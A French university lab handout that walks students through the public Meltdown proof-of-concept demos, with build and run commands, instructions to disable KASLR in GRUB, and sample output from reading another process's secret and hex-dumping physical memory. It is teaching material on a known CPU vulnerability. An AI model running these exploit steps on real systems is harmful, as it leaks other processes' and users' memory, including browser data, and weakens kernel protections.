---
title: TP Meltdown
Author: Nathan Verdier, Chloe Morgond, Lucie Boudoule, Rémi Regnault, Thomas
geometry: margin=2cm
---

## Mot clé
taskset permet de crée un affiliété entre un processuce et un coeur.  
0x1 = coeur 1 du processeur (peut être remplacer par un autre) essayer d'en utiliser un qui sert par trop au moment ou vous le faite pour évité d'avoir des données parasite.  
Mémoire physique = 0xffff880000000000. Utile quand ont a pas désactivé kaslr.  


## Virtual Machine

## Prérequie
cloner ce dépot : https://github.com/IAIK/meltdown.git  
Et allez dans le dossier **meltdown**.

## Exo1
À partir du noyau Linux 4.12, KASLR (Kernel Address Space Layout Randomizaton) est actif par défaut. Cela signifie que l'emplacement du noyau (ainsi que la carte physique directe qui mappe l'intégralité de la mémoire physique) change à chaque redémarrage.

Cette démo utilise Meltdown pour divulguer la randomisation (secrète) de la carte physique directe. Cette démo nécessite les privilèges root pour accélérer le processus. Le document décrit une variante qui ne nécessite pas de privilèges root.

Exécuter cette commande:
```shell
make
taskset 0x1 ./test
```
si la commande marche vous verrez:
```
Expect: Welcome to the wonderful world of microarchitectural attacks
   Got: Welcome to the wonderful world of microarchitectural attacks
```

## Méthode 1 : Permet de connaitre ou est la mémoire virtuelle
**Cette méthode peut être très longue, puvant dépasser les 10/20mins d'attentes vois plus si ont a pas de chance**
```shell
sudo taskset 0x1 ./kaslr
```

Résultat de ce style:
`[+] Direct physical map offset: 0xffff880000000000`



## Méthode 2 : Pour exposer la mémoire et désactivé KASLR en ligne de commande linux il suffit de faire :
**Recommande ceette méthode**
```shell
sudo nano /etc/default/grub
```
**d'ajouter ceci:**
**Avant:**
GRUB_CMDLINE_LINUX="quiet splash"

**Après:**
GRUB_CMDLINE_LINUX="quiet splash nokaslr"

```shell
sudo update-grub
sudo reboot
```


## Exo2

Cette démo teste la fiabilité de la lecture de la mémoire physique. Pour cette démo, soit vous avez besoin du décalage de carte physique direct exo1, soit vous devez désactiver KASLR en spécifiant nokaslr dans la ligne de commande de votre noyau.

Construire et exécuter
Construisez et démarrez la fiabilité. Si KASLR est activé, le premier paramètre est le décalage de la carte physique directe. Sinon, le programme ne nécessite aucun paramètre.

**Avec mémoire virtuelle**
```shell
sudo taskset 0x1 ./reliability 0xffff880000000000
```

**Avec kaslr désactivé**
```shell
sudo taskset 0x1 ./reliability
```

Fonctionne si affiche quelque chose de similaire:
```shell
[+] Direct physical map offset: 0xffff880000000000
```


## Exo3
Cette démo lit la mémoire d'un processus différent en lisant directement la mémoire physique. Pour cette démo, soit vous avez besoin du décalage de carte physique direct (par exemple de la démo n°2), soit vous devez désactiver KASLR en spécifiant nokaslr dans la ligne de commande de votre noyau.

En principe, ce programme peut lire des adresses physiques arbitraires. Cependant, comme la mémoire physique contient beaucoup de données non lisibles par l'homme, nous fournissons un outil de test (secret), qui met en mémoire une chaîne lisible par l'homme et fournit directement l'adresse physique de cette chaîne.

```shell
sudo ./secret
```

```
[+] Secret: If you can read this, this is really bad
[+] Physical address of secret: 0x390fff400
[+] Exit with Ctrl+C if you are done reading the secret
```

Pendant que le programme secret est en cours d'exécution, démarrez physical_reader. Le premier paramètre est l'adresse physique imprimée par secret. Si vous n'avez pas désactivé KASLR, le deuxième paramètre est le décalage de la carte physique directe.

**Avec mémoire virtuelle**
```shell
taskset 0x1 ./physical_reader 0x390fff400 0xffff880000000000
```

**Avec kaslr désactivé**
```shell
taskset 0x1 ./physical_reader 0x390fff400
```

**Résultat:**
```shell
[+] Physical address       : 0x390fff400
[+] Physical offset        : 0xffff880000000000
[+] Reading virtual address: 0xffff880390fff400

If you can read this, this is really bad
```

## Exo 4

Cette démo vide le contenu de la mémoire. Comme les démos n°3 et n°4, il utilise la carte physique directe pour vider le contenu de la mémoire physique dans un format de type hexdump.

Encore une fois, comme la mémoire physique contient beaucoup de contenu non lisible par l'homme, nous fournissons un outil de test pour remplir de grandes quantités de mémoire physique avec des chaînes lisibles par l'homme.

Construire et exécuter
Pour la démo, exécutez d'abord memory_filler pour remplir la mémoire avec des chaînes lisibles par l'homme. Le premier argument est la quantité de mémoire (en gigaoctets) à remplir.

```shell
./memory_filler 9
```

Ensuite, exécutez l'outil memdump pour vider le contenu de la mémoire. Si vous avez déjà exécuté memory_filler, vous devriez voir des fragments de chaîne. Si vous utilisez Firefox ou Chrome avec plusieurs onglets en cours d'exécution, vous pouvez également voir des parties des sites Web ouvertes ou récemment fermées.

Le premier paramètre est l'adresse physique à laquelle le dump doit commencer (laisser vide pour démarrer au premier gigaoctet). Le deuxième paramètre est la quantité d'octets que vous souhaitez lire, pour tout lire, donnez -1. Si vous n'avez pas désactivé KASLR, le troisième paramètre est le décalage de la carte physique directe.



**Avec mémoire virtuelle**
```shell
taskset 0x1 ./memdump 0x240000000 -1 0xffff880000000000 # start at 9 GB
```

**Avec kaslr désactivé**
```shell
taskset 0x1 ./memdump 0x240000000 -1 # start at 9 GB
```

**Résultat:**
```shell
 240001c9f: | 00 6d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .m.............. |
 24000262f: | 00 7d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .}.............. |
 24000271f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 6e 20 75 | ............en u |
 24000272f: | 73 65 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 | ser space and ke |
 24000273f: | 72 6e 65 6c 57 65 6c 63 6f 6d 65 20 74 6f 20 74 | rnelWelcome to t |
 24000298f: | 00 61 72 79 20 62 65 74 77 65 65 6e 20 75 73 65 | .ary between use |
 24000299f: | 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 72 6e | r space and kern |
 2400029af: | 65 6c 42 75 72 6e 20 61 66 74 65 72 20 72 65 61 | elBurn after rea |
 2400029bf: | 64 69 6e 67 20 74 68 69 73 20 73 74 72 69 6e 67 | ding this string |
 240002dcf: | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 | ................ |
 2400038af: | 6a 75 73 74 20 73 70 69 65 64 20 6f 6e 20 61 00 | just spied on a. |
 240003c8f: | 00 00 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ |
 24000412f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 74 73 2e | ............ets. |
 24000413f: | 2e 2e 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 65 | ..Welcome to the |
 2400042ff: | 00 00 00 00 00 00 00 00 00 6e 67 72 61 74 75 6c | .........ngratul |
 24000430f: | 61 74 69 6f 6e 73 2c 20 79 6f 75 20 6a 75 73 74 | ations, you just |
 24000431f: | 20 73 70 69 65 64 20 6f 6e 20 61 6e 20 61 70 70 |  spied on an app |
```


Toute la doc dispo ici [Doc Meltdown](https://github.com/IAIK/meltdown)
